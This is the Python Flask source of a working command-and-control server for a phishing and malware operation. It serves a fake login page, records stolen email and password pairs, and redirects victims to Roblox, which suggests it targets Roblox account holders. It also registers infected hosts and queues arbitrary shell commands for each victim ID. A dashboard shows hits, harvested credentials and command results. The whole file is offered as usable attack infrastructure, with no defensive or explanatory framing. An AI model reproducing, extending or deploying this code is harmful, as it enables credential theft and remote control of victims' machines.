import os, json, datetime
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
DATA_DIR = "c2_data"
os.makedirs(DATA_DIR, exist_ok=True)

LOG_FILE     = os.path.join(DATA_DIR, "hits.log")
CREDS_FILE   = os.path.join(DATA_DIR, "creds.log")
CMD_FILE     = os.path.join(DATA_DIR, "commands.json")
RESULTS_FILE = os.path.join(DATA_DIR, "results.log")

def log(path, line):
    ts = datetime.datetime.utcnow().isoformat()
    with open(path, "a", encoding="utf-8") as f:
        f.write(f"[{ts}] {line}\n")
    print(f"[{ts}] {line}")

def load_cmds():
    if not os.path.exists(CMD_FILE): return {}
    try:
        with open(CMD_FILE) as f: return json.load(f)
    except: return {}

def save_cmds(d):
    with open(CMD_FILE, "w") as f: json.dump(d, f, indent=2)

@app.route("/")
def dash():
    def tail(p, n=200):
        if not os.path.exists(p): return "(empty)"
        with open(p, encoding="utf-8", errors="ignore") as f:
            return "".join(f.readlines()[-n:])
    return render_template_string(DASH,
        hits=tail(LOG_FILE), creds=tail(CREDS_FILE), results=tail(RESULTS_FILE))

@app.route("/login")
def login_page():
    here = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(here, "login.html"), "r", encoding="utf-8") as f:
        return f.read()

@app.route("/register", methods=["POST"])
def register():
    d = request.get_json(force=True, silent=True) or {}
    vid = d.get("vid", "unknown")
    ip  = request.headers.get("X-Forwarded-For", request.remote_addr)
    log(LOG_FILE, f"REGISTER vid={vid} ip={ip} host={d.get('host')} user={d.get('user')} os={d.get('os')}")
    return jsonify({"ok": True, "vid": vid, "poll": 30})

@app.route("/creds", methods=["POST"])
def creds():
    d = request.get_json(force=True, silent=True) or {}
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    log(CREDS_FILE, f"CREDS vid={d.get('vid')} ip={ip} email={d.get('email')} password={d.get('password')} stage={d.get('stage')}")
    return jsonify({"ok": True, "redirect": "https://www.roblox.com/home"})

@app.route("/cmd", methods=["POST"])
def cmd():
    d = request.get_json(force=True, silent=True) or {}
    vid = d.get("vid", "unknown")
    cmds = load_cmds()
    queue = cmds.get(vid, [])
    if queue:
        cmds[vid] = []
        save_cmds(cmds)
    return jsonify({"cmds": queue})

@app.route("/result", methods=["POST"])
def result():
    d = request.get_json(force=True, silent=True) or {}
    log(RESULTS_FILE, f"RESULT vid={d.get('vid')} cmd={d.get('cmd')} out={str(d.get('out'))[:500]}")
    return jsonify({"ok": True})

@app.route("/push", methods=["POST"])
def push():
    vid = request.form.get("vid","").strip()
    cmd = request.form.get("cmd","").strip()
    if vid and cmd:
        cmds = load_cmds()
        cmds.setdefault(vid, []).append(cmd)
        save_cmds(cmds)
    return dash()

DASH = """
<!doctype html><html><head><title>C2</title>
<style>body{font:13px monospace;background:#111;color:#0f0;padding:20px}
h2{color:#0f0}pre{background:#000;padding:10px;border:1px solid #333;max-height:400px;overflow:auto}
form{display:inline}input,button{font:12px monospace;background:#222;color:#0f0;border:1px solid #444;padding:4px}
</style></head><body>
<h2>HITS</h2><pre>{{hits}}</pre>
<h2>CREDS</h2><pre>{{creds}}</pre>
<h2>RESULTS</h2><pre>{{results}}</pre>
<h2>PUSH COMMAND</h2>
<form method="post" action="/push">
  victim id: <input name="vid" size="30">
  command:   <input name="cmd" size="50">
  <button>push</button>
</form>
</body></html>
"""

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    print(f"C2 listening on 0.0.0.0:{port}")
    app.run(host="0.0.0.0", port=port, threaded=True)